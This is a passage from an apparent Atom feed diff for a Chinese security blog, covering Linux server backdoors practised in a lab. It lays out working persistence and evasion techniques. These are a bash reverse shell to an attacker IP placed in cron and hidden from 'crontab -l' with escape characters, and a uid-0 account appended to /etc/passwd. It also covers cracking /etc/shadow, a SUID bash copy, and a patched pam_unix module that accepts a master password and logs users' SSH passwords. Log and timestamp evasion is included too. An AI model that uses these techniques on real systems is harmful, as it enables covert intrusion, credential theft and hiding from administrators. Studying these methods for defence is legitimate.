+ &lt;code&gt;exec 0&amp;lt;&amp;amp;9;exec 1&amp;gt;&amp;amp;9 2&amp;gt;&amp;amp;1;&lt;/code&gt; ：&lt;strong&gt;文件描述符&lt;/strong&gt; 0：stdin，1：stdout，把标准输入输出&lt;strong&gt;都&lt;/strong&gt;重定向到描述符 9；&lt;br /&gt;
+ &lt;code&gt;/bin/bash --noprofile -i&lt;/code&gt; ：开一个 Shell。&lt;br /&gt;
+其实就是利用 Bash &lt;strong&gt;反弹&lt;/strong&gt;一个&lt;strong&gt; Shell&lt;/strong&gt; 到指定的攻击者 IP&lt;/p&gt;
+&lt;p&gt;（ubuntu 默认&lt;strong&gt;没开&lt;/strong&gt; bash 的网络重定向选项，需要加上 &lt;code&gt;–enable-net-redirections&lt;/code&gt;  重新编译 bash）&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;隐藏：&lt;/strong&gt;&lt;br /&gt;
+但是这样的一个后门，管理员直接执行 &lt;code&gt;crontab -l&lt;/code&gt;  就能看到我们设定的定时任务。&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442659/Typera/2023/04/e8f07ae16e6573488c17eeea6f3339f2.png&#34; alt=&#34;image-20230426011055514&#34; /&gt;&lt;br /&gt;
+ 这个命令其实是在读取  &lt;code&gt;/var/spool/cron/crontabs/root&lt;/code&gt;  文件。&lt;br /&gt;
+所以，我们可以利用 cat 的一个缺陷，使用一些&lt;strong&gt;转义字符&lt;/strong&gt;，比如 \r 回车符 \n 换行符 \f 换页符，来&lt;strong&gt;隐藏&lt;/strong&gt;我们不想让管理员看到的命令：&lt;br /&gt;
+ &lt;code&gt;(crontab -l;printf &amp;quot;*/60 * * * * exec 9&amp;lt;&amp;gt; /dev/tcp/192.168.158.132/2333;exec 0&amp;lt;&amp;amp;9;exec 1&amp;gt;&amp;amp;9 2&amp;gt;&amp;amp;1;/bin/bash --noprofile -i;\rno crontab for &lt;/code&gt; whoami &lt;code&gt;%100c\n&amp;quot;)|crontab -&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442674/Typera/2023/04/0af7f80743588f2bae6b80f3903e55c6.png&#34; alt=&#34;image-20230426011110789&#34; /&gt; 但是，若是使用 &lt;code&gt;cat -A /var/spool/cron/crontabs/root&lt;/code&gt;  还是可以看到我们隐藏的东西的。&lt;/p&gt;
+</content>
+        <category term="Backdoor" />
+        <category term="Linux" />
+        <category term="Kali" />
+        <updated>2022-04-02T15:36:35.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89/</id>
+        <title>linux 服务器常见的留后门方式（一）</title>
+        <link rel="alternate" href="https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89/"/>
+        <content type="html">&lt;div class=&#34;note primary&#34;&gt;
+&lt;p&gt;整理好了搭环境的文章：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLnN5Y2Ftb3JlLnRvcC8yMDIyLzAzLzIxL0xJTlVYJUU1JTkwJThFJUU5JTk3JUE4JUU1JUE0JThEJUU3JThFJUIwJUU3JThFJUFGJUU1JUEyJTgzJUU2JTkwJUFEJUU1JUJCJUJBLw==&#34;&gt;LINUX 后门复现环境搭建&lt;/span&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;p&gt;攻击者在通过各种手段获得服务器的控制权之后，通常会在服务器上布置一些脚本、进程、链接，即所谓的&lt;strong&gt;后门&lt;/strong&gt;。其目的是，方便攻击者以后对该服务器进行持久性的攻击。&lt;/p&gt;
+&lt;p&gt;其中，在 linux 服务器上留后门的常见技术，&lt;strong&gt;本文中会提及&lt;/strong&gt;如下几种：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;增加用户账号&lt;/li&gt;
+&lt;li&gt;破解用户密码&lt;/li&gt;
+&lt;li&gt;放置 SUID Shell&lt;/li&gt;
+&lt;li&gt;PAM 后门&lt;/li&gt;
+&lt;li&gt;SSH 软链接后门&lt;br /&gt;
+...&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;增加用户账号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#增加用户账号&#34;&gt;#&lt;/a&gt; 增加用户账号&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;前提&lt;/strong&gt;：getshell，已获得服务器的 root 权限&lt;/p&gt;
+&lt;h3 id=&#34;uid0用户可远程登陆&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#uid0用户可远程登陆&#34;&gt;#&lt;/a&gt; uid=0 用户可远程登陆&lt;/h3&gt;
+&lt;p&gt;可以通过下面这一行指令，增加一个&lt;strong&gt;超级用户账号&lt;/strong&gt;：&lt;br /&gt;
+ &lt;code&gt;echo &amp;quot;用户名:x:0:0::/:/bin/sh&amp;quot; &amp;gt;&amp;gt; /etc/passwd&lt;/code&gt; &lt;br /&gt;
+ 然后通过： &lt;code&gt;passed 用户名&lt;/code&gt; 命令，修改所设超级用户的密码&lt;/p&gt;
+&lt;h4 id=&#34;实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实现&#34;&gt;#&lt;/a&gt; 实现：&lt;/h4&gt;
+&lt;p&gt;输入命令：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441422/Typera/2023/04/a0f37b7036c0a7b07b57165d34510dc9.png&#34; alt=&#34;image-20230426005018227&#34; /&gt;&lt;br /&gt;
+（增加超级用户 backdoor）&lt;br /&gt;
+然后通过 ssh 登录 backdoor 账户：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441429/Typera/2023/04/a74b221974a59bbf958dea2d1d49823f.png&#34; alt=&#34;image-20230426005025313&#34; /&gt;&lt;br /&gt;
+ 可以看到已经是 root 权限了：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441436/Typera/2023/04/2523b36be81cd6a668b416a6bbf6ca66.png&#34; alt=&#34;image-20230426005032317&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;原理：给服务器增加一个&lt;strong&gt; ID 为 0&lt;/strong&gt; 的账号（因为&lt;strong&gt; root&lt;/strong&gt; 的 ID 为 0）&lt;br /&gt;
+我们可以通过 &lt;code&gt;vim /etc/passwd&lt;/code&gt;  命令打开 passwd，所有用户名称与 ID 的对应关系都保存在这里。&lt;br /&gt;
+在文件开头，能看到 root:&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441444/Typera/2023/04/8c6aa69ccdebdd7b75bfaddbc6d434d4.png&#34; alt=&#34;image-20230426005041049&#34; /&gt; 在文件的最后，我们能够找到刚刚添加的账号（backdoor）&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441452/Typera/2023/04/198980bd4423bb1cd26fcb757cbea990.png&#34; alt=&#34;image-20230426005048939&#34; /&gt; 已禁止 uid=0 用户远程登陆&lt;/p&gt;
+&lt;p&gt;管理员可以&lt;strong&gt;禁止 root 用户&lt;/strong&gt;通过&lt;strong&gt; ssh&lt;/strong&gt; 的方式，远程登录服务器。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;禁止方法&lt;/strong&gt;如下：&lt;br /&gt;
+（首先保证拥有一个普通用户，否则禁用之后就无法远程登陆了）&lt;br /&gt;
+ &lt;code&gt;vim /etc/ssh/sshd_config&lt;/code&gt;  打开 sshd_config 文件&lt;br /&gt;
+找到  &lt;code&gt;PermitRootLogin&lt;/code&gt; ，改为 no&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441458/Typera/2023/04/fd0d61d6e7b7879eb2ea1d5f0de03dd5.png&#34; alt=&#34;image-20230426005055500&#34; /&gt; 然后重启 ssh 服务&lt;br /&gt;
+此时再通过 xshell 远程登录 root 账户，就会被拒绝：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441465/Typera/2023/04/d70b4faf22b9b537f1bbe6bb7f20d1f3.png&#34; alt=&#34;image-20230426005101801&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;如果遇到了禁用 uid=0 账户远程登录的情况，也可以增加一个&lt;strong&gt;普通用户&lt;/strong&gt;：&lt;br /&gt;
+ &lt;code&gt;echo &amp;quot;用户名:x:1000:1000::/:/bin/sh&amp;quot; &amp;gt;&amp;gt; /etc/passwd&lt;/code&gt; &lt;br /&gt;
+ 道理都是一样的，可以观察到，我们使用的普通用户的 ID 就是 1000&lt;/p&gt;
+&lt;h3 id=&#34;无交互情况下添加账户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无交互情况下添加账户&#34;&gt;#&lt;/a&gt; 无交互情况下添加账户&lt;/h3&gt;
+&lt;p&gt;所利用漏洞的不一样，会导致攻击者可能面临无法交互、没有回显的情况，&lt;br /&gt;
+在这种情况下，使用前两种方法是困难的，先给出如下的方法：&lt;/p&gt;
+&lt;p&gt;命令 &lt;code&gt;useradd 用户名 -u 0 -o -g root -G root&lt;/code&gt;  以及 &lt;code&gt;echo &amp;quot;密码&amp;quot; | passwd --stdin 用户名&lt;/code&gt; ，&lt;br /&gt;
+若服务器基于&lt;strong&gt; Debian&lt;/strong&gt;，即不能使用 --stdin 操作的话，第二条改用命令 &lt;code&gt;echo 用户名:密码 | chpasswd&lt;/code&gt; ，或者粗暴地直接用 \n 回车（因为 passwd 是需要&lt;strong&gt;输入两次&lt;/strong&gt;密码的）： &lt;code&gt;echo &amp;quot;密码\n密码&amp;quot; | passwd 用户名&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;第一个命令：使用 useradd 命令增加用户，-u 设置用户 id 为 0（root 用户），-g-G 设置新用户所在群组及附加群组为 root。如果禁止 root 远程登录，更改对应的参数就行。&lt;/li&gt;
+&lt;li&gt;第二个命令：添加密码（linux 中新创建的用户是被锁定的，需使用 passwd 命令设置密码，才能投入使用）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h3&gt;
+&lt;p&gt;但是这种增加用户账号的方法，会很轻易地被管理员发现&lt;/p&gt;
+&lt;h2 id=&#34;破解用户密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#破解用户密码&#34;&gt;#&lt;/a&gt; 破解用户密码&lt;/h2&gt;
+&lt;p&gt;如果我们获得了某些用户的密码，那下次自然就可以直接登录了。&lt;/p&gt;
+&lt;p&gt;linux 在 passwd 中存储了用户的信息，但是 passwd 文件允许&lt;strong&gt;所有用户读取&lt;/strong&gt;，所以若是用户密码也存放在 passwd 中，将导致用户密码&lt;strong&gt;泄露&lt;/strong&gt;。&lt;br /&gt;
+因此 Linux 将密码信息&lt;strong&gt;单独存放&lt;/strong&gt;到 shadow 文件中。shadow &lt;strong&gt;只有 root 用户&lt;/strong&gt;拥有读权限，其他用户&lt;strong&gt;没有任何权限&lt;/strong&gt;，从而保证用户密码的安全性。&lt;/p&gt;
+&lt;p&gt;但是，如果获得 shadow 文件 **（/etc/shadow）**，你会看到里面的密码是这样的：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441478/Typera/2023/04/ee471def5fbcc8ec8666e76bd4403e8d.png&#34; alt=&#34;image-20230426005115328&#34; /&gt; 当然是密码的 hash 值，不会让你直接看到的密码的明文&lt;/p&gt;
+&lt;p&gt;但是，对于那些薄弱的密码，我们可以通过 &lt;strong&gt;John the Ripper&lt;/strong&gt; 弱口令扫描工具（Kali 自带）进行破解。使用方法如下&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;使用 unshadow 命令组合 passwd 和 shadow，获得 test： &lt;code&gt;unshadow /etc/passwd /etc/shadow &amp;gt; test&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;字典破解：使用自带的字典（usr/share/john/password.lst）：命令 &lt;code&gt;john test&lt;/code&gt; &lt;br /&gt;
+ 使用自己的字典：命令 &lt;code&gt;john --wordlist=字典路径 test&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;放置suid-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#放置suid-shell&#34;&gt;#&lt;/a&gt; 放置 SUID Shell&lt;/h2&gt;
+&lt;p&gt;前提：getshell，已获得服务器的 root 权限&lt;/p&gt;
+&lt;p&gt;SUID Shell 是一种&lt;strong&gt;能以 shell 拥有者权限运行&lt;/strong&gt;的 shell，&lt;br /&gt;
+这个后门其实就是更改了，拥有者为 root 的 shell 的属性（rwsr-xr-x）&lt;/p&gt;
+&lt;h3 id=&#34;命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令&#34;&gt;#&lt;/a&gt; 命令&lt;/h3&gt;
+&lt;p&gt;root 下执行命令：&lt;br /&gt;
+ &lt;code&gt;cp /bin/bash .shell&lt;/code&gt; &lt;br /&gt;
+ &lt;code&gt;chmod u+s .shell&lt;/code&gt; &lt;br /&gt;
+ 解释：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;复制 /bin/bash 为当前目录下名为 .shell 的文件，&lt;/li&gt;
+&lt;li&gt;更改 .shell 文件权限，设置为 u+s 后，其他用户&lt;strong&gt;都享有文件拥有者的权限&lt;/strong&gt;（而当前为 &lt;strong&gt;root&lt;/strong&gt;，即享有 root 权限）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;下次如果从普通用户登录服务器，就能用命令： &lt;code&gt;/.shell&lt;/code&gt;  ，运行这个 shell，从而获得 &lt;strong&gt;root&lt;/strong&gt; 权限。&lt;br /&gt;
+但是，bash2 针对 SUID Shell 做了一些&lt;strong&gt;护卫措施&lt;/strong&gt;，所以如果使用上述命令运行 .shell ，只能当你在&lt;strong&gt;本地&lt;/strong&gt;下（非远程连接）才能让 shell 的权限升为 root ，若是在远程运行，则还是原来的权限不变。&lt;/p&gt;
+&lt;p&gt;对于这种情况，需要使用这个命令运行： &lt;code&gt;/.shell -p&lt;/code&gt; ，这样在远程下也能获得 root 的 shell 了 &amp;gt;&lt;/p&gt;
+&lt;h3 id=&#34;实现-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实现-2&#34;&gt;#&lt;/a&gt; 实现&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441485/Typera/2023/04/7f3bd66ffe0223053f8eec312efe1e52.png&#34; alt=&#34;image-20230426005121969&#34; /&gt;&lt;br /&gt;
+whoami 为 root&lt;/p&gt;
+&lt;h2 id=&#34;pam后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pam后门&#34;&gt;#&lt;/a&gt; PAM 后门&lt;/h2&gt;
+&lt;h3 id=&#34;pam简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pam简介&#34;&gt;#&lt;/a&gt; PAM 简介：&lt;/h3&gt;
+&lt;p&gt;在 Linux 中执行某些程序时，执行前要先对启动它的用户进行认证，比如我们经常使用的 &lt;strong&gt;su&lt;/strong&gt; 命令。&lt;br /&gt;
+但是，实际工作时，我们常常得用&lt;strong&gt;不同的认证机制&lt;/strong&gt;去认证不同程序的账号口令，这就会导致一个主机上有多个&lt;strong&gt;不同的认证系统&lt;/strong&gt;，这显然是不合理的。&lt;br /&gt;
+所以就有了&lt;strong&gt; PAM 机制&lt;/strong&gt;。&lt;strong&gt;PAM&lt;/strong&gt; 可以说是一套&lt;strong&gt; API&lt;/strong&gt;，使管理员可以随意地选择程序的认证方式。&lt;br /&gt;
+PAM 使用目录 **/etc/pam.d/&lt;strong&gt; 下的配置文件，即对应着不同的认证方式。程序调用目录下相应的配置文件，从而调用本地的认证模块（&lt;/strong&gt;/lib/security/**）。&lt;/p&gt;
+&lt;h3 id=&#34;后门思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后门思路&#34;&gt;#&lt;/a&gt; 后门思路：&lt;/h3&gt;
+&lt;p&gt;我们&lt;strong&gt;登录&lt;/strong&gt;的时候，也是用 PAM 模块来验证我们的密码是否正确的。&lt;br /&gt;
+所以，我们可以从源码中找到&lt;strong&gt; PAM&lt;/strong&gt; 的传统密码验证模块（pam_unix.so），&lt;strong&gt;修改 PAM 的验证逻辑&lt;/strong&gt;，达成不去跟 shadow 里的密码校验，而是&lt;strong&gt;直接返回验证正确&lt;/strong&gt;的效果，&lt;br /&gt;
+然后编译出&lt;strong&gt;包含后门的 so 文件&lt;/strong&gt;，替换原模块。&lt;/p&gt;
+&lt;h3 id=&#34;实现-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实现-3&#34;&gt;#&lt;/a&gt; 实现：&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;直接使用脚本：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpdHNhbmQvc2hlbGwvYmxvYi9tYXN0ZXIvcGFtLnNo&#34;&gt;https://github.com/litsand/shell/blob/master/pam.sh&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;手动更改&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;下载pam源码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载pam源码&#34;&gt;#&lt;/a&gt; 下载 PAM 源码&lt;/h4&gt;
+&lt;p&gt;首先确认 PAM 版本：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Debian： &lt;code&gt;dpkg -s libpam-modules | grep -i version | cut -d&#39; &#39; -f2&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Centos： &lt;code&gt;rpm -qa|grep pam&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;以我的 kali 为例，使用 &lt;code&gt;dpkg -s libpam-modules | grep -i version | cut -d&#39; &#39; -f2&lt;/code&gt; ，得到输出：&lt;strong&gt;1.4.0-11&lt;/strong&gt;&lt;br /&gt;
+ 去 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5saW51eC1wYW0ub3JnL2xpYnJhcnkv&#34;&gt;http://www.linux-pam.org/library/&lt;/span&gt; 或者 GitHub 发布稳定版的地址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpbnV4LXBhbS9saW51eC1wYW0vcmVsZWFzZXMlRUYlQkMlOEMlRTQlQjglOEIlRTglQkQlQkQlRTUlODglQjAlRTglODclQUElRTUlQjclQjElRTclODklODglRTYlOUMlQUMlRTclOUElODQlRTYlQkElOTAlRTclQTAlODElRUYlQkMlOUE=&#34;&gt;https://github.com/linux-pam/linux-pam/releases，下载到自己版本的源码：&lt;/span&gt;&lt;br /&gt;
+&lt;strong&gt;下载&lt;/strong&gt;： &lt;code&gt; wget https://github.com/linux-pam/linux-pam/releases/download/v1.4.0/Linux-PAM-1.4.0.tar.xz&lt;/code&gt; &lt;br /&gt;
+&lt;strong&gt; 解压&lt;/strong&gt;： &lt;code&gt;tar -xvf Linux-PAM-1.4.0.tar.xz&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;修改源码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修改源码&#34;&gt;#&lt;/a&gt; 修改源码&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;效果 1：自定义密码添加：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;修改解压目录下的 &lt;code&gt;/modules/pam_unix/pam_unix_auth.c&lt;/code&gt;  文件：&lt;br /&gt;
+第 173 行下加入： &lt;code&gt;if (strcmp(p,&amp;quot;密码&amp;quot;)==0) &amp;#123;return PAM_SUCCESS;&amp;#125;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441501/Typera/2023/04/34fdc632b2e79b17065c6ee808b2095f.png&#34; alt=&#34;image-20230426005137550&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;很简单的代码：当输入的 p 和我们设定的 &amp;quot;密码&amp;quot; 相同的时候，返回直接验证成功。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;编译：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;确保有安装&lt;strong&gt; gcc 编译器&lt;/strong&gt;和&lt;strong&gt; flex 库&lt;/strong&gt;，&lt;br /&gt;
+&lt;strong&gt;编译&lt;/strong&gt;命令如下：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd Linux-PAM-1.4.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 未防止修改的 so 不正确，先找到原文件&lt;strong&gt;备份&lt;/strong&gt;一个：&lt;/p&gt;
+&lt;p&gt;命令 &lt;code&gt;find / -name &amp;quot;pam_unix.so&amp;quot;&lt;/code&gt;   （找原文件地址）&lt;br /&gt;
+我&lt;strong&gt;原文件&lt;/strong&gt;的地址在：&lt;strong&gt;/usr/lib/x86_64-linux-gnu/security/pam_unix.so&lt;/strong&gt;&lt;br /&gt;
+ 编译出的&lt;strong&gt;新文件&lt;/strong&gt;在：&lt;strong&gt;root/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so&lt;/strong&gt;&lt;br /&gt;
+ &lt;code&gt;cp /usr/lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_unix.so.bak&lt;/code&gt; （备份在 /tmp/pam_unix.so.bak）&lt;br /&gt;
+ &lt;code&gt;cp /root/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so&lt;/code&gt; （复制新 so 文件，覆盖原文件）&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;尝试用设定的密码登录：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;（注意登录的需要是已有账户） &lt;code&gt;ssh 已有账户名@192.168.158.128&lt;/code&gt; &lt;br /&gt;
+ 用自定义的 &lt;strong&gt;hello&lt;/strong&gt; 密码，登录 root 成功：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441509/Typera/2023/04/8fa2af1fefbe5dab45f472a0e29e89b9.png&#34; alt=&#34;image-20230426005144666&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;不足 &amp;amp; 优化：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;若是管理员&lt;strong&gt;查看登录日志&lt;/strong&gt;：&lt;br /&gt;
+实时查看最后 10 条  &lt;code&gt;tail -f -n 10 /var/log/auth.log&lt;/code&gt; （视具体情况不同，日志也有可能是 /var/log/secure）&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441513/Typera/2023/04/69c6d32a187e72672948a797b8239c8a.png&#34; alt=&#34;image-20230426005149260&#34; /&gt;&lt;br /&gt;
+ 第一条是从 ssh 输入&lt;strong&gt;正确密码&lt;/strong&gt;登录的日志，第二条是输入&lt;strong&gt;自定义的密码&lt;/strong&gt;登陆的日志，&lt;br /&gt;
+可以看到，第二条会比第一条多出一行记录，&lt;strong&gt;报告验证失败&lt;/strong&gt;，&lt;br /&gt;
+这是因为，在我们添加语句的前一行，先使用了 &lt;strong&gt;_unix_verify_password&lt;/strong&gt; 函数进行了验证：&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441525/Typera/2023/04/36756d8cdaf5be17fc933eb923916d51.png&#34; alt=&#34;image-20230426005201757&#34; /&gt;&lt;br /&gt;
+ 既然如此，我们可以找到函数 _unix_verify_password 的&lt;strong&gt;位置&lt;/strong&gt;，在它验证之前，插入之前的那行代码，这样就能够&lt;strong&gt;避免验证密码报错&lt;/strong&gt;。&lt;br /&gt;
+更改文件的路径为 Linux-PAM-1.4.0/modules/pam_unix/support.c，如下图：&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441530/Typera/2023/04/206c7138eeede30e24a10e586daa7fcc.png&#34; alt=&#34;image-20230426005205935&#34; /&gt;&lt;br /&gt;
+ 重新编译覆盖之后，ssh 远程登录，查看日志：&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441538/Typera/2023/04/0a3b87fb36dbc9ad01b198b4b7497f9a.png&#34; alt=&#34;image-20230426005213331&#34; /&gt;&lt;br /&gt;
+ 可以看到，第三条就和第一条一样了。&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;若是管理员查看&lt;strong&gt;文件修改的时间&lt;/strong&gt;：&lt;br /&gt;
+可以用 touch -r 命令修改新文件的时间：&lt;br /&gt;
+ &lt;code&gt;touch pam_unix.so -r /tmp/pam_unix.so.bak&lt;/code&gt; （改为备份文件的时间）&lt;br /&gt;
+修改前后用 &lt;code&gt;stat pam_unix.so*&lt;/code&gt;  命令查看结果如下所示：&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441542/Typera/2023/04/63ec0bad9935885af21524b174d934d7.png&#34; alt=&#34;image-20230426005217672&#34; /&gt;&lt;br /&gt;
+（仅更改了两项，可能还是会被管理员察觉，但是通过 -t 可以设定档案的时间记录)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;lt;br&amp;gt;&lt;br /&gt;
+&lt;strong&gt; 效果 2：记录通过 ssh 登录的用户密码：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;同样修改解压目录下的 &lt;code&gt;/modules/pam_unix/pam_unix_auth.c&lt;/code&gt;  文件：&lt;br /&gt;
+在第 173 行下加入，如下图所示：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441547/Typera/2023/04/e0996c17577375def40744fabaf69c5e.png&#34; alt=&#34;image-20230426005222756&#34; /&gt;&lt;br /&gt;
+ 每次有用户登录的时候，将用户名 name 和密码 p 保存在 /tmp/.record_pwd 文件中&lt;/p&gt;
+&lt;p&gt;保存 -&amp;gt; 编译 -&amp;gt; 覆盖 -&amp;gt; 从 ssh 用正常密码登录几次账号，提供记录的数据 -&amp;gt; 查看保存的文件：&lt;br /&gt;
+ &lt;code&gt;cat /tmp/.record_pwd&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441550/Typera/2023/04/c09d43ce405bdb94fdbbc667420539ad.png&#34; alt=&#34;image-20230426005227686&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;ssh软连接后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh软连接后门&#34;&gt;#&lt;/a&gt; SSH 软连接后门&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;前提&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;getshell，已获得服务器的 root 权限，&lt;/li&gt;
+&lt;li&gt;ssh 配置中开启了 PAM 进行身份验证（验证 PAM 是否开启： &lt;code&gt;cat/etc/ssh/sshd_config|grep UsePAM&lt;/code&gt; ）一般默认开启&lt;/li&gt;
+&lt;li&gt;防火墙关闭，或者开放了使用的端口号&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理：&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;软连接简介：&lt;/strong&gt;&lt;br /&gt;
+软链接，就是一个指向另一个档案位置的，特殊的档案。&lt;br /&gt;
+软连接以路径的形式存在。类似于 Windows 操作系统中的&lt;strong&gt;快捷方式&lt;/strong&gt;。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;若 ssh 配置中&lt;strong&gt;开启了 PAM 身份验证机制&lt;/strong&gt;，PAM 模块会搜寻相关设定文件（一般在 **/etc/pam.d/&lt;strong&gt;）。&lt;br /&gt;
+而在&lt;/strong&gt; /etc/pam.d/su&lt;strong&gt; 文件中启用了&lt;/strong&gt; pam_rootok.so** 模块。&lt;br /&gt;
